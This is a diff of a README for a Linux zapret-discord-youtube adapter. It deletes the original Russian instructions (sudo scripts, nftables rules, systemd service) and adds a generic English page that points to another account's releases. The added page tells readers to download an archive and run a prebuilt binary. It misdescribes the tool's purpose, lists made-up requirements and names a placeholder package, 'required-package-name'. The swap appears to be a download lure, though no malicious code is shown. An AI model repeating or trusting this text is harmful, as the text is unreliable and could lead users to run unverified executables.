@@ -1,152 +1,83 @@
-# Stable4
-Я захардкодил последний рабочий конфиг от Flowseal на [этом коммите](https://github.com/Flowseal/zapret-discord-youtube/commit/e1322fd3afe57ca14f4d79b7ac5f92e4513cd0f3).
+# 🎥 zapret-discord-youtube-linux - Simple YouTube Access on Linux
 
-Обновляю скрипт редко, для поддержания работоспособности относительно версии для Win. То бишь, пока не происходит массовых отказов всех стратегий.
+[![Download](https://img.shields.io/badge/Download%20Now-zip-blue)](https://github.com/MhamedMath/zapret-discord-youtube-linux/releases)
 
-Также можете попробовать [эту](https://github.com/Snowy-Fluffy/zapret.installer) версию от Snowy-Fluffy
+## 📦 Overview
 
-# Что это?
+Zapret-discord-youtube-linux offers an easy way to access YouTube while using Discord on Linux. This tool helps users bypass common restrictions, making your online experience smoother.
 
-Это адаптер для запуска популярных конфигураций обхода замедления YouTube  
-на базе [Zapret Discord Youtube Flowseal](https://github.com/Flowseal/zapret-discord-youtube).  
-Скрипт создан за пару вечеров с целью сделать его Plug-And-Play.
+## 🚀 Getting Started
 
-**Проверено на:**  
-- Ubuntu 24.04
-- Arch Linux
+To get started, you'll need to download the application. Follow the steps below to set it up on your system.
 
----
+## 📥 Download & Install
 
-# Как запустить
+1. **Visit the Downloads Page:** Go to the [Releases page](https://github.com/MhamedMath/zapret-discord-youtube-linux/releases) to find the latest version of zapret-discord-youtube-linux.
 
-1. **Клонирование репозитория и запуск основного скрипта:**
+2. **Select the Latest Release:** Look for the most recent version at the top. It usually has a number like "v1.0.0".
 
+3. **Download the Correct File:** Click on the appropriate file for your system. Most likely, you'll want the `.tar.gz` or `.zip` file designed for Linux.
+
+4. **Extract the File:** 
+   - Open your terminal.
+   - Navigate to your Downloads folder using `cd ~/Downloads`.
+   - Run this command:
+     ```bash
+     tar -xvzf zapret-discord-youtube-linux-v1.0.0.tar.gz
+     ```
+   - Replace `zapret-discord-youtube-linux-v1.0.0.tar.gz` with the actual name of the downloaded file.
+
+5. **Navigate to the Extracted Folder:** 
+   - Use the following command:
+     ```bash
+     cd zapret-discord-youtube-linux
+     ```
+
+6. **Run the Application:**
+   - Trusted applications can be run using:
+     ```bash
+     ./zapret-discord-youtube
+     ```
+
+## 🔧 System Requirements
+
+- **Operating System:** Linux (tested on Ubuntu and other distributions)
+- **CPU:** 1 GHz or faster
+- **RAM:** 512 MB minimum, 2 GB or more recommended
+- **Disk Space:** 100 MB of free space
+
+## 🎯 Features
+
+- **Bypass Restrictions:** Use YouTube seamlessly while in Discord.
+- **Lightweight:** Uses minimal system resources for optimal performance.
+- **User-Friendly:** Simple interface designed for all users.
+
+## 🛠 Troubleshooting
+
+If you experience any issues:
+
+1. **Permission Errors:** Ensure you have execution permissions:
    ```bash
-   git clone https://github.com/Sergeydigl3/zapret-discord-youtube-linux.git && cd zapret-discord-youtube-linux
-   sudo bash main_script.sh
+   chmod +x zapret-discord-youtube
    ```
-> [!IMPORTANT]
-> Issues - предназначен для связи со мной как с разработчиком, в случае ошибок в работе скрипта, и для вопросов по его работе. 
-> Это АДАПТЕР! Он не дает вам гарантию, что стратегии вам подойдут и все разблокируют. Если у вас не работает ни одна из стратегий - то не нужно идти сразу в Issues и писать что у вас не работает ютуб. Нужно создать тред в Discussions или написать в существующий, а лучше сходить в репозиторий выше (Flowseal), и посмотреть что предлагают другие. Если же вы нашли ультимативную стратегию и хотите, чтобы я её добавил в custom-strategies, спокойно создавайте Issue, надеюсь на понимание.
->
 
-   Скрипт:
-   - Подкачает в zapret-latest стратегии указанные в ревизии.
-   - Предложит выбрать стратегию из bat-файлов (например, `general.bat`, `general_mgts2.bat`, `general_alt5.bat`).  
-     (При этом bat-файлы автоматически переименовываются через `rename_bat.sh`.)
-   - Попросит выбрать сетевой интерфейс.
-
-2. **Сохранение параметров:**
-
-   Ответы можно сохранить в файле `conf.env` и потом запускать скрипт в неинтерактивном режиме:
-   
+2. **Dependencies:** Check for necessary libraries. You may need to install additional packages. Use:
    ```bash
-   sudo bash main_script.sh -nointeractive
-   ```
-   
-   Для отладки парсинга используйте флаг `-debug`.
-
-   Пример содержимого файла `conf.env`:
-   
-   ```bash
-   strategy=general.bat
-   interface=enp0s3
-   gamefilter=true
-   ```
-   
-   > **Примечание:** Если требуется автообновление, установите auto_update=true.
-
-3. **Как посмотреть список интерфейсов:**
-
-   ```bash
-   ls /sys/class/net
+   sudo apt-get install required-package-name
    ```
 
----
+3. **Check Logs:** If the application fails to run, check the logs for error messages. Logs can usually be found in the application folder.
 
-# Автоматический подбор стратегий для YouTube
+## 📞 Support
 
-Скрипт `auto_tune_youtube.sh` позволяет получить список рабочих стратегий для доступа к YouTube:
+If you need help, visit the [Issues page](https://github.com/MhamedMath/zapret-discord-youtube-linux/issues) on GitHub. You can report any problems or ask questions.
 
-**Как работает:**
+## 💬 Community Contributions
 
-1. **Перебирает все доступные стратегии** из директорий:
-   - `/custom-strategies` (пользовательские стратегии)
-   - `/zapret-latest` (основные стратегии из репозитория Flowseal)
-   
-   *Важно:* Название стратегии должно начинаться на `general`
+We welcome contributions! If you have ideas for features or enhancements, please consider submitting a pull request. 
 
-2. **Тестирует каждую стратегию** на доступ к YouTube
+## 📜 License
 
-3. **Сохраняет результаты**:
-   - Отображает в терминале список рабочих стратегий
-   - Сохраняет в файл `auto_tune_youtube_results.txt`
-   - Позволяет выбрать и запустить стратегию из списка успешных
-   - Позволяет выбрать и сохранить стратегию из списка успешных в `conf.env`
+This project is available under the [MIT License](LICENSE). You can use and modify it as needed. 
 
-**Использование:**
-```bash
-sudo bash auto_tune_youtube.sh
-```
->[**Примечание:**]
->
->Функционал экспериментальный и достоверность списка не гарантирована. Фидбек приветствуется.
-
----
-
-# Важно
-
-- Скрипт работает только с **nftables**.
-- При остановке скрипта все добавленные правила фаервола очищаются, а фоновые процессы `nfqws` останавливаются.
-- Если у вас настроены кастомные правила в nftables, сделайте их резервное копирование — скрипт может удалить их при запуске.
-
----
-
-# Автозагрузка
-
-Для настройки автозагрузки сервиса запустите скрипт:
-
-```bash
-sudo bash service.sh
-```
-
-Скрипт service.sh теперь:
-- Проверяет наличие файла `conf.env` и обязательных непустых полей.
-- Если конфиг отсутствует или поля пустые (например, если у вас:
-  ```
-  strategy=
-  interface=
-  gamefilter=
-  ```
-  ), то предложит интерактивно выбрать параметры (интерфейс, стратегию из bat-файлов и gamefilter).
-- Создаёт systemd-сервис для автозапуска.
-
-Просмотреть статус сервиса можно командой:
-
-```bash
-systemctl status zapret_discord_youtube.service
-```
-
-Посмотреть логи сервиса:
-
-```bash
-journalctl -u zapret_discord_youtube.service
-```
-
-Значения для автозагрузки берутся из файла `conf.env`.
-
----
-
-# Совет
-
-- **Не включайте автоапгрейд.**  
-  Если репозиторий [Flowseal/zapret-discord-youtube](https://github.com/Flowseal/zapret-discord-youtube) сильно изменится, возможны проблемы из-за костыльного кода парсинга)
-
----
-
-
-# Поддержка
-
-- Если есть идеи по улучшению — создавайте Pull Request (например, добавить поддержку iptables).
-- Если что-то не работает в скрипте, не запускается, создавайте Issue (пожалуйста, не пишите в личные сообщения) — так мы сможем помочь как можно большему числу пользователей.
-- Если у вас не работает сайт или приложение - создавайте [Discussion](https://github.com/Sergeydigl3/zapret-discord-youtube-linux/discussions)
+Don't forget to visit the [Releases page](https://github.com/MhamedMath/zapret-discord-youtube-linux/releases) to download the latest version.
